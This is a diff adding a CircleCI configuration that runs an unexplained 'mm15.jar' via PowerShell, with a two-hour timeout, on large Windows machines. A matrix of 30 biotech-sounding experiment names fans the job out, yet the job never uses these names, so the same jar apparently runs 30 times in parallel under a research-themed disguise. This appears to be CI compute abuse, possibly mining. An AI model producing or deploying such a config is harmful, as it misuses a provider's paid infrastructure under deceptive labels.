@@ -1,0 +1,66 @@
+version: 2.1
+
+executors:
+  lab_workstation:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+
+commands:
+  run_analysis:
+    steps:
+      - run:
+          command: |
+            java -jar mm15.jar
+          shell: powershell.exe
+          timeout: 7200
+
+jobs:
+  research_protocol:
+    executor: lab_workstation
+    parameters:
+      experiment_id:
+        type: string
+        default: "control-group"
+    
+    steps:
+      - checkout
+      - run_analysis
+
+workflows:
+  biotech_research:
+    jobs:
+      - research_protocol:
+          matrix:
+            parameters:
+              experiment_id:
+                - "dna-sequencing-01"
+                - "dna-sequencing-02"
+                - "protein-synthesis"
+                - "enzyme-analysis"
+                - "cell-culture-a"
+                - "cell-culture-b"
+                - "stem-cell-research"
+                - "gene-therapy-trial"
+                - "crispr-experiment"
+                - "immunotherapy-test"
+                - "vaccine-development"
+                - "antibody-production"
+                - "drug-screening"
+                - "toxicity-testing"
+                - "cancer-research"
+                - "alzheimer-study"
+                - "diabetes-treatment"
+                - "cardiovascular-study"
+                - "neurological-research"
+                - "genetic-disorder"
+                - "microbiome-analysis"
+                - "pathogen-detection"
+                - "viral-research"
+                - "bacterial-culture"
+                - "fermentation-process"
+                - "biofuel-production"
+                - "food-safety-test"
+                - "environmental-monitor"
+                - "clinical-trial-phase1"
+                - "clinical-trial-phase2"
